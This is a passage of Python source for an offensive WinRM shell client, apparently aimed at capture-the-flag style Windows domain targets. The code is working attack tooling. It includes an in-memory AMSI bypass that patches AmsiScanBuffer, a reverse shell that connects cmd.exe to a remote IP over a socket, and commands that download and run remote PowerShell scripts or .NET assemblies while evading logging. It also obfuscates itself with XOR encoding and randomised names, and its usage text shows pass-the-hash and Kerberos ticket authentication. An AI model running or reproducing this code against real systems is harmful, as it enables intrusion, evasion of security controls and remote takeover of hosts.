                "rsp:Command" : "",
                "rsp:Arguments" : b64str(messages)
            }
        }
        rsp = self._send(req)

        if rsp.get("command", "") == "OK":
            return command_id




# -- the rest here is UX stuff, meaning a janky Shell and dealing with commandline arguments -------
class CtrlCHandler:
    def __init__(self, max_interrupts=4, timeout=5):
        self.max_interrupts = max_interrupts
        self.timeout = timeout

    def __enter__(self):
        self.interrupted = 0
        self.released = False
        self.original_handler = getsignal(SIGINT)

        def handler(signum, frame):
            self.interrupted += 1
            if self.interrupted > 1:
                n = self.max_interrupts - self.interrupted + 2
                print()
                print(f"Ctrl+C spammed, {n} more will terminate ungracefully.")
                print(f"Try waiting ~{self.timeout} more seconds for a client to get a "\
                        "chance to send the interrupt")

            if self.interrupted > self.max_interrupts:
                self.release()

        signal(SIGINT, handler)
        return self

    def __exit__(self, type, value, tb):
        self.release()

    def release(self):
        if self.released:
            return False

        signal(SIGINT, self.original_handler)
        self.released = True
        return True

# -- some types and imports for upload/download/amsi/netrun/psrun functionality: ------------------
_ns = "A" + randbytes(randint(3,8)).hex()
_xor_key = randint(1,255)

# a workaround for getting a streaming console output from dynamically loaded .NET assemblies:
host_writer_cs = """
Add-Type -TypeDefinition @"
namespace _NS {
public class HostWriter : System.IO.TextWriter {
  private System.Action<string> _act;
  public HostWriter(System.Action<string> act) { _act = act; }
  public override void Write(char v) { _act(v.ToString()); }
  public override void Write(string v) { _act(v); }
  public override void WriteLine(string v) { _act(v + System.Environment.NewLine); }
  public override System.Text.Encoding Encoding { get { return System.Text.Encoding.UTF8; } }
}}
"@""".replace("_NS", _ns)

# it is way too slow to do this in powershell for large files:
xor_enc_cs = """
Add-Type @"
namespace _NS {
public class X {
    public static byte[] x(byte[] y) {
        for(int i = 0; i < y.Length; i++) { y[i] ^= _KEY; }
        return y;
    }
}}
"@
""".replace("_NS", _ns).replace("_KEY", str(_xor_key))

# zipping files on windows will have \ as path separators and some linux tools bork:
path_fix_cs = """
Add-Type @"
namespace _NS {
public class PathFix : System.Text.UTF8Encoding {
    public override byte[] GetBytes(string s) {
        s=s.Replace("\\\\", "/");
        return base.GetBytes(s);
    }
}}
"@
""".replace("_NS", _ns)

# mangle DllImports a little:
def dll_import(ns, lib, fun, sigs):
    cls  = f"f{randbytes(randint(3,8)).hex()}"
    name = f"g{randbytes(randint(3,8)).hex()}"
    ret  = sigs[0]
    args = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
    code = f'[DllImport("{lib}",EntryPoint="{fun}")] public static extern {ret} {name}({args});'
    globals()["_call_"   + fun] = f"[{_ns}.{cls}]::{name}"
    globals()["_import_" + fun] = f"""Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"""

# this will add _import_LoadLibrary and _call_LoadLibrary variables in global scope, etc:
dll_import(_ns, "kernel32", "LoadLibrary",    ["IntPtr", "string"])
dll_import(_ns, "kernel32", "GetProcAddress", ["IntPtr", "IntPtr", "string"])
dll_import(_ns, "kernel32", "VirtualProtect", ["IntPtr", "IntPtr", "IntPtr", "uint", "out uint"])
dll_import(_ns, "kernel32", "CreateProcess",  ["IntPtr", "IntPtr", "string", "IntPtr", "IntPtr", "bool", "uint", "IntPtr", "IntPtr", "Int64[]", "byte[]"])
dll_import(_ns, "ws2_32",   "WSAStartup",     ["IntPtr", "short", "byte[]"])
dll_import(_ns, "ws2_32",   "WSASocket",      ["IntPtr", "uint", "uint", "uint", "IntPtr", "uint", "uint"])
dll_import(_ns, "ws2_32",   "WSAConnect",     ["IntPtr", "IntPtr", "byte[]", "int", "IntPtr", "IntPtr", "IntPtr", "IntPtr"])

# when splicing strings into powershell scripts use this so not to worry about escaping chars, etc:
def str_b64(arg):
    return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"

class Shell:
    def __init__(self, transport, args):
        self.args       = args
        self.transport  = transport
        self.cwd        = ""
        self.stdout_log = None
        self.need_clear = False

        if args.log:
            self.start_log()

        try:
            if sys.stdout.isatty():
                from prompt_toolkit import prompt, ANSI
                from prompt_toolkit.history import FileHistory
                __history = FileHistory(".winrmexec_prompt_toolkit_history")
                self.prompt = lambda s: prompt(ANSI(s), history=__history, enable_history_search=True)
            else:
                raise ModuleNotFoundError # fallthrough to use readline

        except ModuleNotFoundError:
            import readline, atexit

            if sys.stdout.isatty():
                logging.warning("'prompt_toolkit' not installed, using built-in 'readline'")

            histfile = ".winrmexec_readline_history"
            try:
                readline.read_history_file(histfile)
            except FileNotFoundError:
                pass
            atexit.register(readline.write_history_file, histfile)
            self.prompt = input

    def __del__(self):
        self.stop_log()

    def start_log(self):
        if not self.stdout_log:
            logfile = f"winrmexec_{int(time.time())}_stdout.log"
            self.write_info(f"logging output to {logfile}")
            self.stdout_log = open(logfile, "wb")

    def stop_log(self):
        if self.stdout_log:
            self.stdout_log.close()
            self.stdout_log = None

    def help(self):
        print()
        print("Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully")
        print("\x1b[1m\x1b[31mThis is not an interactive shell!\x1b[0m If you need to run programs that expect")
        print("inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell")
        print()
        print("Special !bangs:")
        print("  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'")
        print("                                   # if it contains whitespace")
        print()
        print("  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr")
        print("                                   # if you can reach your ip from the box, because this can be slow;")
        print("                                   # use -xor only in conjunction with !psrun/!netrun")
        print()
        print("  !amsi                            # amsi bypass, run this right after you get a prompt")
        print()
        print("  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is")
        print("                                   # needed unless that script tries to load a .NET assembly; if you can't reach")
        print("                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\\foo\\bar.ps1' (needs absolute path)")
        print()
        print("  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;")
        print("                                   # !amsi first if you're getting '...program with an incorrect format' errors;")
        print("                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\\foo\\bar.exe' (needs absolute path)")
        print()
        print("  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you")
        print("                                   # you need to run an executable that expects input, try:")
        print("                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' \"line1`nline2`nline3\"")
        print("                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'")
        print()
        print("  !log                             # start logging output to winrmexec_[timestamp]_stdout.log")
        print("  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log")
        print()

    def repl(self, inputs=None, debug=True):
        with Runspace(self.transport, self.args, timeout=5) as runspace:
            self.update_cwd(runspace)
            for cmd in map(str.strip, inputs or self.read_line()):
                if not cmd:
                    continue
                elif cmd in { "exit", "quit", "!exit", "!quit" }:
                    return
                elif cmd.startswith("!download "):
                    self.download(runspace, cmd.removeprefix("!download "))
                elif cmd.startswith("!upload "):
                    self.upload(runspace, cmd.removeprefix("!upload "))
                elif cmd.startswith("!amsi"):
                    self.amsi_bypass(runspace)
                elif cmd.startswith("!netrun "):
                   self.netrun(runspace, cmd.removeprefix("!netrun "))
                elif cmd.startswith("!psrun "):
                   self.psrun(runspace, cmd.removeprefix("!psrun "))
                elif cmd.startswith("!revshell "):
                    self.revshell(runspace, cmd.removeprefix("!revshell "))
                elif cmd.startswith("!log"):
                    self.start_log()
                elif cmd.startswith("!stop_log"):
                    self.stop_log()
                elif cmd.startswith("!") or cmd in { "help", "?" }:
                    self.help()
                else:
                    if self.stdout_log:
                        self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
                        self.stdout_log.flush()
                    self.run_with_interrupt(runspace, cmd, self.write_line)
                    self.update_cwd(runspace)

    def update_cwd(self, runspace):
        self.cwd = self.run_sync(runspace, "Get-Location | Select -Expand Path").strip()

    def read_line(self):
        while True:
            try:
                cmd = self.prompt(f"\x1b[1m\x1b[33mPS\x1b[0m {self.cwd}> ")
            except KeyboardInterrupt:
                continue
            except EOFError:
                return
            else:
                yield cmd

    def write_warning(self, msg):
        self.write_line({ "warn" : msg })

    def write_info(self, msg):
        self.write_line({ "info" : msg, "endl" : "\n" })

    def write_error(self, msg):
        self.write_line({ "error" : msg })

    def write_progress(self, msg):
        self.write_line({ "progress" : msg })

    def write_line(self, out):
        clear = "\033[2K\r" if self.need_clear else ""
        self.need_clear = False

        log_msg = b""
        if "stdout" in out: # from Write-Output
            msg = out.get("stdout")
            print(clear + msg, flush=True)
            log_msg = msg.encode() + b"\n"

        elif msg := out.get("info"): # from Write-Host
            endl = out.get("endl", "\n")
            print(clear + msg, end=endl, flush=True)
            log_msg = msg.encode() + endl.encode()

        elif msg := out.get("error"): # from Write-Error and exceptions
            print(clear + "\x1b[31m" + msg + "\x1b[0m", flush=True)

        elif msg := out.get("warn"): # from Write-Warning
            print(clear + "\x1b[33m" + msg + "\x1b[0m", flush=True)

        elif msg := out.get("verbose"): # from Write-Verbose
            print(clear + msg, flush=True)

        elif progress := out.get("progress"): # from Write-Progress
            print(clear + "\x1b[34m" + progress + "\x1b[0m", end="\r", flush=True)
            self.need_clear = True

        if self.stdout_log:
            self.stdout_log.write(log_msg)
            self.stdout_log.flush()


    def run_sync(self, runspace, cmd):
        # use this only for short CmdLets you know will complete quickly and will not fail
        # or timeout; also make sure that command selects exactly the property of the output
        # that it needs with `... | Select -Expand PROP`, otherwise the outer `| Out-String`
        # CmdLet will try to pretty-print the output which will sometimes truncate the lines
        # in the output to fit into what it thinks is the width of the terminal:
        return "\n".join(out.get("stdout") for out in runspace.run_command(cmd) if "stdout" in out)

    def run_with_interrupt(self, runspace, cmd, output_handler=None, exception_handler=None):
        # run a command and start streaming the output; this runs in the CtrlCHandler
        # context so you can gracefully catch the Ctrl+C interrupts and try to send 'ctrl_c'
        # signal to the remote pipeline instead of tearing down the program.

        # `output_handler` is a function that receives a dict with { "stdout" : ".." } or
        # { "error" : ".." }, etc and deals with it, don't to throw exceptions there;

        # `exception_handler` should handle exceptions that happen inside `runspace.run_command`;
        # if you think you dealt with the exception, return `True` and this will try
        # continue the streaming, but maybe just let it fail or use it only to format debug messages;
        # if `exception_handler` is not specified it will throw;
        output_stream = runspace.run_command(cmd)
        while True:
            with CtrlCHandler(timeout=5) as h:
                try:
                    out = next(output_stream)
                except StopIteration:
                    break
                except Exception as e:
                    if exception_handler and exception_handler(e):
                        continue
                    else:
                        raise e

                if output_handler:
                    output_handler(out)

                if h.interrupted:
                    runspace.interrupt()

        return h.interrupted > 0


    def psrun(self, runspace, cmdline):
        args = split_args(cmdline)[:2]

        url = args[-1]
        xorfunc = ""
        if args[0].lower() == "-xor":
            if len(args) != 2:
                self.write_warning("missing URL")
                return

            if args[-1].lower().startswith("http"):
                self.write_warning("use -xor only for files that were uploaded with !upload -xor")
                return

            xorfunc = f"[{_ns}.X]::x"

        commands = [
            xor_enc_cs,
            f'$c = (New-Object Net.WebClient).DownloadData({str_b64(url)})',
            f'$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))',
             "$c = $c.Ast.EndBlock.Copy()",
             "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
             "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
             "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
             "Remove-Variable @('a','b','c')"
        ]

        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(runspace, cmd, self.write_line)


    def netrun(self, runspace, cmdline):
        args = split_args(cmdline)
        if args[0].lower() == "-xor":
            if len(args) == 1:
                self.write_warning("missing URL and [ARGS..]")
                return
            xorfunc = f"[{_ns}.X]::x"
            args = args[1:]
        else:
            xorfunc = ""

        args = [ str_b64(arg) for arg in args ]

        url = args[0]
        argv = "[string[]]@(" + ",".join(args[1:]) + ")"

        commands = [
            host_writer_cs, xor_enc_cs,
            f"$buf = (New-Object Net.WebClient).DownloadData({url})",
            f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
            f"$out = New-Object {_ns}.HostWriter {{ Write-Host -NoNewLine $args }}",
            f"[Console]::SetOut($out); [Console]::SetError($out)",
            f"$dll.EntryPoint.Invoke($null,(,{argv}))",
            f"[Console]::SetOut([IO.StreamWriter]::Null)",
            f"[Console]::SetError([IO.StreamWriter]::Null)",
            f"$out.Dispose()",
            f"Remove-Variable @('buf','dll','out')"
        ]

        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(runspace, cmd, self.write_line)


    def amsi_bypass(self, runspace):
        ns = "A" + randbytes(2).hex()
        commands = [
            _import_LoadLibrary,
            _import_GetProcAddress,
            _import_VirtualProtect,
            f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
            f"{_call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
            f"Start-Sleep -Seconds 1", # this seems to do the trick for now...
            f"[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
            f"Start-Sleep -Seconds 1",
            f"{_call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
        ]
        for cmd in commands:
            logging.debug(cmd)
            self.run_sync(runspace, cmd)


    def revshell(self, runspace, cmdline):
        args = split_args(cmdline)
        try:
            ip, port = ip_address(args[0]).packed, int(args[1])
            p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
        except:
            return

        commands = [
            _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
            f"{_call_WSAStartup}(0x202,(New-Object byte[] 64))",
            f"$sock = {_call_WSASocket}(2,1,6,0,0,0)",
            f"{_call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},12,0,0,0,0,0,0,0,0),16,0,0,0,0)",
            f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
            f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
            f"Remove-Variable @('sock','sinfo')"
        ]

        for cmd in commands:
            logging.debug(cmd)
            self.run_with_interrupt(runspace, cmd, self.write_line)


    def upload(self, runspace, cmdline):
        args = split_args(cmdline)

        if args[0].lower() == "-xor":
            unxor = False
            args = args[1:]
        else:
            unxor = True

        src = Path(args[0])
        dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
        try:
            with open(src, "rb") as f:
                buf = f.read()
        except IOError as e:
            self.write_error(str(e))
            return

        tmpfn = self.run_sync(runspace, "[IO.Path]::GetTempPath()")
        tmpfn = tmpfn + randbytes(8).hex() + ".tmp"
        total = 0
        self.write_info(f"uploading to {tmpfn}")

        self.run_sync(runspace, xor_enc_cs)
        for chunk in chunks(buf, 65536):
            total += len(chunk)
            chunk = xorenc(chunk, _xor_key)
            xorfunc = f"[{_ns}.X]::x" if unxor else ""
            ps = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}([Convert]::FromBase64String('{b64str(chunk)}'))))"

            interrupted = self.run_with_interrupt(runspace, ps)
            if interrupted:
                self.write_warning("upload interrupted")
                self.run_sync(runspace, f"Remove-Item -Force '{tmpfn}'")
                return

            self.write_progress(f"progress: {total}/{len(buf)}")

        self.write_info(f"moving from {tmpfn} to {dst}")
        ps = f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst}'"
        self.run_with_interrupt(runspace, ps, self.write_line)

        ps = f"(Get-FileHash '{dst}' -Algorithm MD5).Hash"
        out = self.run_sync(runspace, ps)
        md5sum = MD5.new(buf if unxor else xorenc(buf, _xor_key))
        if out.strip() != md5sum.hexdigest().upper():
            self.write_error("Corrupted upload")


    def download(self, runspace, cmdline):
        args = split_args(cmdline)
        if len(args) == 0 or len(args) > 2:
            self.write_warning("usage: !download RPATH [LPATH]")
            return

        src = self.run_sync(runspace, f"Resolve-Path -LiteralPath '{args[0]}' | Select -Expand Path")
        if not src:
            self.write_warning(f"{args[0]} not found")
            return

        src = PureWindowsPath(src)

        dst = Path(args[1]) if len(args) == 2 else Path(src.name)
        if dst.is_dir():
            dst = dst.joinpath(src.name)

        if not dst.parent.exists():
            os.makedirs(dst.parent, exist_ok=True)

        src_is_dir = self.run_sync(runspace, f"Test-Path -Path '{src}' -PathType Container") == "True"
        if src_is_dir:
            if not dst.name.lower().endswith(".zip"):
                dst = Path(dst.parent).joinpath(f"{dst.name}.zip")
            self.write_info(f"{src} is a directory, will download a zip file of its contents to {dst}")

            tmpdir = self.run_sync(runspace, "[System.IO.Path]::GetTempPath()")
            tmpnm = randbytes(8).hex()
            tmpfn = tmpdir + tmpnm
            ps = f"""
                Add-Type -AssemblyName "System.IO.Compression.FileSystem"
                New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
                Get-ChildItem -Force -Recurse -Path '{src}' | ForEach-Object {{
                    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
                        try {{
                            $dst = $_.FullName.Replace('{src}', '')
                            Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn}\\$dst"
                        }} catch {{
                            Write-Warning "skipping $dst"
                        }}
                    }}
                }}
                {path_fix_cs}
                [IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip', [IO.Compression.CompressionLevel]::Fastest, $true, $(New-Object {_ns}.PathFix))
                Remove-Item -Recurse -Force -Path '{tmpfn}'
            """

            self.run_with_interrupt(runspace, ps, self.write_line)
            src = tmpfn + ".zip"

        ps = f"""function Download-Remote {{
            $h = Get-FileHash '{src}' -Algorithm MD5 | Select -Expand Hash;
            $f = [System.IO.File]::OpenRead('{src}');
            $b = New-Object byte[] 65536;
            while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
            $f.Close();
            [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
            }}
            Download-Remote
            Remove-Item Function:Download-Remote
        """

        self.write_info(f"downloading {src}")
        def collect(buf, out):
            if part := out.get("stdout"):
                buf += b64decode(part)
                self.write_progress(f"progress: {len(buf)} bytes")

        buf = bytearray()
        self.run_with_interrupt(runspace, ps, lambda out: collect(buf, out))

        if src_is_dir:
            self.run_sync(runspace, f"Remove-Item -fo '{src}'") # remove the zip too

        if buf[-32:] != MD5.new(buf[:-32]).hexdigest().upper().encode():
            self.write_error("Corrupted download or file access error")
            return

        self.write_info(f"done, writing to {dst.resolve()}")
        try:
            with open(dst, "wb") as f:
                f.write(buf[:-32])
        except IOError as e:
            self.write_error(str(e))


def main():
    """# NTLM Examples:
  $ winrmexec.py 'box.htb/username:password@dc.box.htb'
  $ winrmexec.py 'username:password@dc.box.htb'
  $ winrmexec.py -hashes 'LM:NT' 'username@dc.box.htb'
  $ winrmexec.py -hashes ':NT' 'username@dc.box.htb'

If password/hashes are not specified, it will prompt for password:
  $ winrmexec.py username@dc.box.htb

If '-target-ip' is specified, target will be ignored (still needs '@' after user[:pass])
  $ winrmexec.py -target-ip '10.10.11.xx' 'username:password@whatever'
  $ winrmexec.py -target-ip '10.10.11.xx' 'username:password@'

If '-target-ip' is not specified, then target-ip=target

If '-ssl' is specified, it will use 5986 port and https:
  $ winrmexec.py -ssl 'username:password@dc01.box.htb'

If '-port' is specified, it will use that instead of 5985. If 'ssl' is also specified it will use https:
  $ winrmexec.py -ssl -port 8443 'username:password@dc01.box.htb'

If '-url' is specified, target, target-ip and port will be ignored:
  $ winrmexec.py -url 'http://dc.box.htb:8888/endpoint' 'username:password@whatever'

If '-url' is not specified it will be constructed as http(s)://target_ip:port/wsman

# Kerberos Examples:
  $ winrmexec.py -k 'box.htb/username:password@dc.box.htb'
  $ winrmexec.py -k -hashes 'LM:NT' 'box.htb/username@dc.box.htb'
  $ winrmexec.py -k -aesKey 'AESHEX' 'box.htb/username@dc.box.htb'

If KRB5CCACHE is in env, it will use domain and username from there:
  $ KRB5CCNAME=ticket.ccache winrmexec.py -k -no-pass 'dc.box.htb'

It doesn't hurt if you also specify domain/username, but they will be ignored:
  $ KRB5CCNAME=ticket.ccache winrmexec.py -k -no-pass 'box.htb/username@dc.box.htb'

If target does not resolve to ip, you have to specify target-ip:
  $ winrmexec.py -k -no-pass -target-ip '10.10.11.xx' 'box.htb/username:password@DC'
  $ KRB5CCNAME=ticket.ccache winrmexec.py -k -no-pass -target-ip '10.10.11.xx' DC

For Kerbros auth it is important that target is a host or FQDN, as it will be used
to construct SPN as HTTP/{target}@{domain}.

Or you can specify '-spn' yourself, in which case target will be ignored (or used only as target-ip):
  $ winrmexec.py -k -spn 'http/dc' 'box.htb/username:password@dc.box.htb'
  $ winrmexec.py -k -target-ip '10.10.11.xx' -spn 'http/dc' box.htb/username:password@whatever
  $ KRB5CCNAME=ticket.ccache winrmexec.py -k -no-pass -target-ip '10.10.11.xx' -spn 'http/dc' 'whatever'

If you have a TGS for SPN other than HTTP (for example CIFS) it still works (at least from what i tried)
If you have a TGT, then it will request TGS for HTTP/{target}@{domain} (or whatever was in your '-spn')

If '-dc-ip' is not specified then dc-ip=domain
For '-url' / '-port' / '-ssl' same rules apply as for NTLM

# Basic Auth Examples (not likely to be enabled):
Same as for NTLM except hashes are not supported:
  # winrmexec.py -basic username:password@dc.box.htb
  # winrmexec.py -basic -target-ip '10.10.11.xx' 'username:password@whatever'
  # winrmexec.py -basic -target-ip '10.10.11.xx' -ssl 'username:password@whatever'
  # winrmexec.py -basic -url 'http://10.10.11.xx/endpoint' 'username:password@whatever'
    """

    print(version.BANNER)
    parser = ArgumentParser()

    parser.add_argument("target", help="[[domain/]username[:password]@]<target>")
    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-examples', action='store_true', help='Show examples')

    # -- connection params: -----------------------------------------------------------------------
    group = parser.add_argument_group('connection')
    group.add_argument("-dc-ip", default="",
        help="IP Address of the domain controller. If omitted it will use the "\
             "domain part (FQDN) specified in the target parameter")

    group.add_argument("-target-ip", default="",
        help="IP Address of the target machine. If ommited it will use whatever "\
              "was specified as target. This is useful when target is the NetBIOS"\
              "name and you cannot resolve it")

    group.add_argument("-port", default="",
        help="Destination port to connect to WinRM http server, default is 5985")

    group.add_argument("-ssl", action="store_true", help="Use HTTPS")

    group.add_argument("-basic", action="store_true", help="Use Basic auth")

    group.add_argument("-url", default="",
        help="Exact WSMan endpoint, eg. http://host:port/custom_wsman. "\
             "Otherwise it will be constructed as http(s)://target_ip:port/wsman")

    # -- authentication params: -------------------------------------------------------------------
    group = parser.add_argument_group('authentication')
    group.add_argument("-spn", default="", help="Specify exactly the SPN to request for TGS")

    group.add_argument("-hashes", default="", metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH")

    group.add_argument("-no-pass", action="store_true", help="don't ask for password (useful for -k)")

    group.add_argument("-k", action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME)"\
             "based on target parameters. If valid credentials cannot be found, it will "\
             "use the ones specified in the command line")

    group.add_argument('-aesKey', metavar = "HEXKEY", default="",
        help="AES key to use for Kerberos Authentication")

    # -- shell params: ----------------------------------------------------------------------------
    parser.add_argument("-X", default="", metavar="COMMAND",
        help="Command to execute, if ommited it will spawn a janky interactive shell")

    parser.add_argument("-log", action="store_true",
        help="Will log all stdout to 'winrmexec_[timestamp]_stdout.log")

    args = parser.parse_args()

    if args.examples:
        print(main.__doc__)
        exit()

    logger.init(args.ts)
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, targetName = parse_target(args.target)

    if args.aesKey and not args.k: # aesKey implies kerberos
        logging.info("'-aesKey' key specified, using kerberos")
        args.k = True

    has_creds = password or args.hashes or args.aesKey

    if username and not (has_creds or args.no_pass):
        from getpass import getpass
        password = getpass("Password:")
        has_creds = True

    if not args.target_ip and not args.url:
        args.target_ip = targetName
        logging.info(f"'-target_ip' not specified, using {targetName}")

    if not args.port:
        args.port = 5986 if args.ssl else 5985
        logging.info(f"'-port' not specified, using {args.port}")

    if not args.url:
        if args.ssl:
            args.url = f"https://{args.target_ip}:{args.port}/wsman"
        else:
            args.url = f"http://{args.target_ip}:{args.port}/wsman"
        logging.info(f"'-url' not specified, using {args.url}")
    else:
        args.ssl = urlparse(args.url).scheme == "https"

    if args.k:
        if os.getenv("KRB5CCNAME"): # use domain/username from ccache
            domain, username, _, _ = CCache.parseFile()
            logging.info(f"using domain and username from ccache: {domain}\\{username}")
        elif not domain or not username or not has_creds:
            logging.fatal("Need domain, username and one of password/nthash/aes for kerberos auth")
            exit()
        if not args.spn:
            try:
                ip_address(targetName)
                logging.error(f"when using kerberos and '-spn' is not specified, 'targetName' must be FQDN")
                exit()
            except ValueError:
                pass

        if not args.dc_ip:
            logging.info(f"'-dc_ip' not specified, using {domain}")
            args.dc_ip = domain

        if not args.spn:
            args.spn = args.spn or f"HTTP/{targetName}@{domain}"
            logging.info(f"'-spn' not specified, using {args.spn}")

        Transport = KerberosTransport

    elif args.basic:
        if not username or not password:
            logging.fatal(f"Need username and password for basic auth")
            exit()
        Transport = BasicTransport

    else:
        if not username or not (password or args.hashes):
            logging.fatal(f"Need username and password or hashes for ntlm auth")
            exit()
        Transport = NTLMTransport

    args.domain     = domain
    args.username   = username
    args.password   = password
    args.nt_hash    = args.hashes.split(':')[1] if ':' in args.hashes else ""

    shell = Shell(Transport, args)
    try:
        if args.X:
            shell.repl(iter([args.X]))
        else:
            shell.help()
            shell.repl()
    except EOFError:
        pass

if __name__ == "__main__":
    main()

